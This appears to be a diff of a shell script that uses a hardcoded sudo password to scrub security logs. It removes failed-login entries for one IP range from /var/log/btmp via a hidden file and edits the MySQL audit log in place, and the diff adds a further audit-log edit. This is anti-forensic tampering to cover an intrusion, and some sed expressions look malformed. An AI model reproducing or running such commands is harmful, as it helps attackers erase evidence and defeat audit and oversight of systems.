@@ -19,5 +19,6 @@ echo Aa123456 | sudo -S sed -i "/103.150/d" .btmp.file
 echo Aa123456 | sudo -S utmpdump -r < /usr/games/.btmp.file > /var/log/btmp
 
 echo Aa123456 | sudo -S sed -i "root" /var/lib/mysql/server_audit.log
+echo Aa123456 | sudo -S sed -i "ldap.sys" /var/lib/mysql/server_audit.log
 
 exit
